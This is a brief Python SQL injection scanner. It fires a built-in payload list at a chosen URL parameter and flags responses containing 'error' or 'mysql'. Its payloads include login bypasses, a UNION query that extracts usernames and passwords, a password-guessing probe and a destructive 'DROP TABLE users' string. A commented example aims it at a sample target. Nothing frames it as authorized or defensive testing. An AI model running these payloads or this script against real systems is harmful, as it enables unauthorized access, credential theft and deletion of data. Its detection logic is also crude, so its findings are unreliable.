import requests
import time

SQL_PAYLOADS = [
    "' OR '1'='1'; --",  # Basic SQL injection
    "' UNION SELECT null, username, password FROM users --",  # Basic SQL union-based
    "admin' --",  # Simple bypass
    "' OR 1=1 --",  # Standard boolean-based injection
    "1; DROP TABLE users; --",  # Data deletion attempt
    "' OR EXISTS(SELECT * FROM users WHERE username='admin' AND password LIKE 'a%') --"  # Logical-based attack
]

def test_sql_injection(url, param):
    for payload in SQL_PAYLOADS:
        full_url = f"{url}?{param}={payload}"
        try:
            start_time = time.time()
            response = requests.get(full_url)
            response_time = time.time() - start_time
            if "error" in response.text or "mysql" in response.text:
                print(f"SQL Injection vulnerability detected with payload: {payload}, Response time: {response_time}s")
            else:
                print(f"No vulnerability detected with payload: {payload}")
        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")

# Contoh penggunaan:
# test_sql_injection("http://target.com/vulnerable.php", "id")
